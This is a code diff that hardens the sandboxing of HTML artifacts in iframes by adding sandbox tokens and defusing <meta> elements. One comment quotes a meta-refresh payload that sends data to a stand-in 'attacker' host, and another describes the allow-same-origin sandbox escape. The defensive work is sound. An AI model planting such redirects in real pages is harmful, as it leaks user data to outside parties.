@@ -31,10 +31,30 @@
 //      external host egresses from every scripting path, `file://` included.
 // Full rationale: HTML-ARTIFACT-CAPABILITY-RFC.md §4.7.
 
-// The ONLY sandbox token an artifact frame ever carries. `allow-same-origin` must
-// NEVER join it: together the two let the content clear its own sandbox and reach
-// the app origin. Frozen by tests here and in HtmlArtifactPane.sandbox.test.tsx.
+// Three tokens, deliberately separate even where two share a value today: they
+// answer different questions and must be able to move independently.
+//
+// `allow-same-origin` must NEVER join any of them: paired with `allow-scripts` it
+// lets content clear its own sandbox and reach the app origin. Frozen by tests
+// here and in HtmlArtifactPane.sandbox.test.tsx.
+
+// The frame hosting our TRUSTED shell. Its bootstrap is a script, so this token
+// is structural — it is not a decision about the artifact.
+export const SHELL_SANDBOX = "allow-scripts";
+
+// The inner frame, when the team may run script.
 export const ARTIFACT_SANDBOX = "allow-scripts";
+
+// The inner frame, when it may not. No token at all: no <script> element, no
+// inline handler and no `javascript:` URL executes, by browser guarantee rather
+// than by filtering the markup. This is what the retired DOMPurify pass used to
+// approximate, and it is stronger — there is nothing left to recognize.
+export const STATIC_ARTIFACT_SANDBOX = "";
+
+/** The inner frame's tokens for one team's JavaScript posture. */
+export function artifactSandbox(allowJavaScript: boolean): string {
+  return allowJavaScript ? ARTIFACT_SANDBOX : STATIC_ARTIFACT_SANDBOX;
+}
 
 // `default-src 'none'` blocks every fetch, XHR, WebSocket, frame and remote
 // subresource; `webrtc 'block'` closes the one egress API that no fetch directive
@@ -97,6 +117,20 @@ function defuseLinkElements(html: string): string {
   return html.replace(/<link\b/gi, "<x-link");
 }
 
+// `<meta http-equiv="refresh" content="0;url=https://attacker/?d=…">` NAVIGATES the
+// document. No CSP fetch directive covers a navigation, and the enclosing
+// `frame-src blob:` only guards frames that HAVE a shell around them — the export
+// and fit-width measuring frames (htmlArtifactExport.ts) load the composed document
+// directly, so they had nothing to stop it. The retired DOMPurify pass used to drop
+// `<meta>` outright, which is why removing it opened this.
+//
+// Renamed rather than deleted, same reasoning as `<link>`: deletion needs a closing
+// `>` the author can simply withhold. Author markup has no legitimate use for it —
+// our own CSP `<meta>` is injected by `headInjection`, never taken from the author.
+function defuseMetaElements(html: string): string {
+  return html.replace(/<meta\b/gi, "<x-meta");
+}
+
 /**
  * Compose the artifact into one self-contained HTML document string.
  *
@@ -119,7 +153,7 @@ function defuseLinkElements(html: string): string {
  */
 export function composeHtmlDocument(html: string, css: string, zoom = 1): string {
   const zoomStyle = zoom !== 1 ? `<style>html{zoom:${zoom}}</style>` : "";
-  const body = defuseLinkElements(html);
+  const body = defuseMetaElements(defuseLinkElements(html));
   return `<!doctype html><html><head>${headInjection(css)}${zoomStyle}</head><body>${body}</body></html>`;
 }
 
@@ -161,8 +195,8 @@ export function artifactFileName(title: string, ext = "html"): string {
  * keeps the browser-enforced isolation on the one output path that has no
  * application to provide it.
  */
-export function downloadHtmlArtifact(html: string, css: string, title: string): void {
-  const doc = sandboxedShellDocument(html, css);
+export function downloadHtmlArtifact(html: string, css: string, title: string, allowJavaScript = true): void {
+  const doc = sandboxedShellDocument(html, css, 1, allowJavaScript);
   const blob = new Blob([doc], { type: "text/html" });
   const url = URL.createObjectURL(blob);
   const anchor = document.createElement("a");
@@ -197,7 +231,7 @@ const SHELL_STYLE =
  *
  * `zoom` reaches the artifact document unchanged; only the preview passes one.
  */
-export function sandboxedShellDocument(html: string, css: string, zoom = 1): string {
+export function sandboxedShellDocument(html: string, css: string, zoom = 1, allowJavaScript = true): string {
   const composed = composeHtmlDocument(html, css, zoom);
   // Every `<` becomes a `\u003c` escape — same string value, but no `<` left for the
   // HTML tokenizer — so nothing in the artifact can disturb the shell's bootstrap:
@@ -207,7 +241,7 @@ export function sandboxedShellDocument(html: string, css: string, zoom = 1): str
   const literal = JSON.stringify(composed).replace(/</g, "\\u003c");
   return (
     `<!doctype html><html><head><meta charset="utf-8">${SHELL_CSP}${SHELL_STYLE}</head>` +
-    `<body><iframe id="a" sandbox="${ARTIFACT_SANDBOX}" referrerpolicy="no-referrer"></iframe>` +
+    `<body><iframe id="a" sandbox="${artifactSandbox(allowJavaScript)}" referrerpolicy="no-referrer"></iframe>` +
     `<script>document.getElementById("a").src=` +
     `URL.createObjectURL(new Blob([${literal}],{type:"text/html"}));</script>` +
     `</body></html>`
@@ -243,8 +277,10 @@ export function artifactHasScript(html: string): boolean {
  * too wide for the side panel. Loads a blob: URL of the sandboxed-shell document,
  * opened with `noopener` so it cannot reach `window.opener`.
  */
-export function openHtmlArtifactInNewTab(html: string, css: string): void {
-  const blob = new Blob([sandboxedShellDocument(html, css)], { type: "text/html" });
+export function openHtmlArtifactInNewTab(html: string, css: string, allowJavaScript = true): void {
+  const blob = new Blob([sandboxedShellDocument(html, css, 1, allowJavaScript)], {
+    type: "text/html",
+  });
   const url = URL.createObjectURL(blob);
   window.open(url, "_blank", "noopener,noreferrer");
   // Keep the URL alive long enough for the new tab to load, then free it.
